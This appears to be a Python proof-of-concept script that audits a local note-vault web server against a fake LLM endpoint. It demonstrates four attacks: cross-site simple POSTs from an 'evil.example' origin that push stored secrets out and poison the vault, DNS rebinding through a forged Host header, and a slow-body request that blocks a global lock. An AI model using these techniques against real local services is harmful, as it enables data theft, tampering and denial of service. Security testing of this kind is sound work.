import json, os, socket, sys, tempfile, threading, time, http.client
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
REPO = str(__import__("pathlib").Path(__file__).resolve().parents[4]); sys.path.insert(0, REPO)

captured = []
class Fake(BaseHTTPRequestHandler):
    def log_message(self,*a): pass
    def do_POST(self):
        n=int(self.headers["Content-Length"]); captured.append(json.loads(self.rfile.read(n)))
        b=json.dumps({"choices":[{"message":{"content":"ok narrated"}}]}).encode()
        self.send_response(200); self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
fake = ThreadingHTTPServer(("127.0.0.1",0),Fake); threading.Thread(target=fake.serve_forever,daemon=True).start()
os.environ.update(NVIDIA_API_KEY="k", CONTINUUM_LLM_PROVIDER="nvidia",
                  CONTINUUM_NVIDIA_BASE_URL=f"http://127.0.0.1:{fake.server_port}")

from continuum_web import server as S
ws = Path(tempfile.mkdtemp())/"ws"
S.Handler.studio = S.Studio(ws)
srv = ThreadingHTTPServer(("127.0.0.1",0),S.Handler); port=srv.server_port
threading.Thread(target=srv.serve_forever,daemon=True).start()
S.Handler.studio.create("owner@example.test","correct horse battery")
S.Handler.studio.capture("Bank","My bank account PIN hint is the dog's birthday; account at Banco Sur 1234-5678.",[])

def req(method,path,body=None,headers=None,timeout=5):
    c=http.client.HTTPConnection("127.0.0.1",port,timeout=timeout)
    c.request(method,path,body=body,headers=headers or {}); r=c.getresponse(); return r.status, r.read().decode()

# A: cross-site "simple" request (text/plain, no preflight) forcing egress
st,b = req("POST","/api/ask",json.dumps({"question":"bank account","allow_narration":True}),
           {"Content-Type":"text/plain","Origin":"https://evil.example"})
print("A cross-site ask:",st,"| egress captured:",len(captured), "|", captured and captured[0]["messages"][1]["content"][:200])
# B: cross-site capture (vault poisoning)
st,b = req("POST","/api/capture",json.dumps({"title":"Will","body":"I leave everything to Mallory.","tags":[]}),
           {"Content-Type":"text/plain","Origin":"https://evil.example"})
print("B cross-site capture:",st, json.loads(b).get("record",{}).get("category"))
# C: DNS rebinding — foreign Host header, response readable by attacker origin
st,b = req("GET","/api/dashboard",headers={"Host":f"rebind.evil.example:{port}"})
print("C rebinding dashboard:",st,b[:120])
# D: slow body holds the global mutex
s=socket.create_connection(("127.0.0.1",port))
s.sendall(b"POST /api/lock HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 50\r\n\r\n{")
time.sleep(0.3)
t=time.time()
try:
    st,_=req("GET","/api/dashboard",timeout=3); print("D dashboard during slow body:",st,round(time.time()-t,2),"s")
except Exception as e: print("D dashboard blocked:",type(e).__name__,round(time.time()-t,2),"s")
s.close()
